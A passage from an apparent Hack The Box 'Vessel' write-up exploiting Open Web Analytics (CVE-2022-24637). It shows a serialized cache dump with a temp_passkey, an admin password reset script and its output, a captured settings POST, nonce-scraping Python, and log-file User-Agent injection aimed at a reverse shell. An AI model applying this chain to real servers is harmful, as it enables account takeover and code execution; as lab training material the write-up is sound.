font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:16:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"last_update_date"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:10:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1650211659"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:6:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BIGINT"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:7:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"api_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">O:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_dbColumn"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:11:{s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:7:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"api_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:32:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"a390cc0247ecada9a2b8d2338b9ca6d2"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"data_type"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VARCHAR(255)"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foreign_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_primary_key"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:14:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"auto_increment"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_unique"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:11:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"is_not_null"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:0</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"label"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"index"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:13:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"default_value"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:16:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_tableProperties"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a:4:{s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"alias"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"user"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:4:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"name"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:8:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"owa_user"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:9:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"cacheable"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:23:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"cache_expiration_period"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">i:604800</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:12:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"wasPersisted"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">b:1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s:5:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"cache"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">N</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">%</span> </span></code></pre></div>
<p>As stated in the blog post, it’s the <strong>temp_passkey</strong> <code>cc25c639f4395109e0381784b7ec840e</code> that can be userd to set a new password for the admin account.</p>
</section>
<section id="step-3" class="level3">
<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
<p>Keep building on the script with the blog post as reference and I’m easily able to decode the base64 blob, capture the <code>temp_passkey</code> value and change the password for user admin.</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel python3 vessel.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> http://openwebanalytics.vessel.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> admin <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> exploit.se</span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> generationg cache file</span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> admin cache found!</span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> extracted temp_passkey: 30e22a1a269d2a65534054bda6ea971b</span>
<span id="cb12-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> changed admin password to: exploit.se</span>
<span id="cb12-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> admin login successful</span></code></pre></div>
<p>We’re now able to login to the service using <code>admin:exploit.se</code> and within we find the directory path:</p>
<p><img src="https://exploit.se/posts/2022-09-02-htb-writeup-vessel/images/vessel08.png" class="img-fluid"></p>
<p>Testing to update a value from “On” to “Off” we se all variables used in the POST request:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb13-1">POST /index.php?owa_do=base.optionsGeneral HTTP/1.1</span>
<span id="cb13-2">Host: openwebanalytics.vessel.htb</span>
<span id="cb13-3">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0</span>
<span id="cb13-4">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span id="cb13-5">Accept-Language: en-US,en;q=0.5</span>
<span id="cb13-6">Accept-Encoding: gzip, deflate</span>
<span id="cb13-7">Content-Type: application/x-www-form-urlencoded</span>
<span id="cb13-8">Content-Length: 772</span>
<span id="cb13-9">Origin: http://openwebanalytics.vessel.htb</span>
<span id="cb13-10">Connection: close</span>
<span id="cb13-11">Referer: http://openwebanalytics.vessel.htb/index.php?owa_do=base.optionsGeneral</span>
<span id="cb13-12">Cookie: owa_passwordSession=c825d3ad67e8ba16dc4f57ddd662a2d296801b6e67017ad76e85350e1ed5ff62; owa_userSession=admin; owa_userSession=admin; owa_passwordSession=49639afc7e742a04d65be47b4eb2ddc2cf0ecb181eddd4151f37e117e280c750</span>
<span id="cb13-13">Upgrade-Insecure-Requests: 1</span>
<span id="cb13-14"></span>
<span id="cb13-15">owa_config%5Bbase.resolve_hosts%5D=0<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.log_feedreaders%5D=1<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.log_robots%5D=0<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.log_named_users%5D=1<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.excluded_ips%5D=%2C<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.anonymize_ips%5D=0<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.fetch_refering_page_info%5D=1<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.query_string_filters%5D=%2C<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.announce_visitors%5D=0<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.notice_email%5D=admin%40vessel.htb<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.geolocation_lookup%5D=1<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.track_feed_links%5D=1<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_config%5Bbase.timezone%5D=America%2FLos_Angeles<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_nonce=ac9b9a2272<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_action=base.optionsUpdate<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;</span>owa_module=base</span></code></pre></div>
<p>To update the log settings we need to figure out how to dynamically get the <code>owa_nonce</code> value and path to log directory. Luckily this is just as easy as doing a GET request:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb14-1"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">def</span> updateLog(target):</span>
<span id="cb14-2">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Update log to prepare for malicious payload</span></span>
<span id="cb14-3">    url <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> target <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">+</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/index.php?owa_do=base.optionsGeneral"</span></span>
<span id="cb14-4">    get_data <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> r.get(url).text</span>
<span id="cb14-5">    nonce <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> re.search(<span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">r'</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\"</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">owa_nonce</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\"</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;"> value</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\=\"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">.</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*?</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\"\&gt;</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>, get_data).group(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>)</span>
<span id="cb14-6">    log_dir <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> re.search(<span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">r'</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\"</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">owa_config</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\[</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">base</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">.</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">async_log_dir</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\]\"</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;"> value</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\=\"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">.</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*?</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">\"\&gt;</span><span class="vs" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>, get_data).group(<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>) </span>
<span id="cb14-7">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[+] extracted nonce:"</span>, nonce)</span>
<span id="cb14-8">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">print</span>(<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"[+] extracted log_dir:"</span>, log_dir)</span></code></pre></div>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel python3 vessel.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> http://openwebanalytics.vessel.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> admin <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> asdf123</span>
<span id="cb15-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb15-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> extracted nonce: ac9b9a2272</span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> extracted log_dir: /var/www/html/owa/owa-data/logs/</span></code></pre></div>
</section>
<section id="step-4" class="level3">
<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
<p>We can now change the log level and log file to <code>.php</code>, to and from here be able to do a log injection to execute php code and get a reverse shell.</p>
<p>The log injection is executed through the <code>User Agent</code> as we controll this variable and can easily verify that it’s reflected:</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb16-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel curl http://openwebanalytics.vessel.htb/owa-data/logs/rev.php</span>
<span id="cb16-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb16-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[debug_log]</span> Request URL:GET / 06:08:36 2022-08-30 3856 </span>
<span id="cb16-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[debug_log]</span> User Agent: ASDF THIS IS A TEST AGENT 06:08:36 2022-08-30 3856 </span>
<span id="cb16-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[debug_log]</span> Host: openwebanalytics.vessel.htb 06:08:36 2022-08-30 3856</span></code></pre></div>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb17-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  vessel python3 cve-2022-24637.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> http://openwebanalytics.vessel.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> admin <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> exploit.se</span>
<span id="cb17-2"></span>
<span id="cb17-3">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">______</span>     _______     ____   ___ ____  ____      ____  _  _    __  __________ </span>
<span id="cb17-4">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span> ___<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ \ </span>  / / ____<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">___</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span>/ _ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>__ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\|</span>___ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span>   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">___</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">||</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span> /_<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">___</span> /___  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb17-5"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\ \ /</span> /<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_____</span> __<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
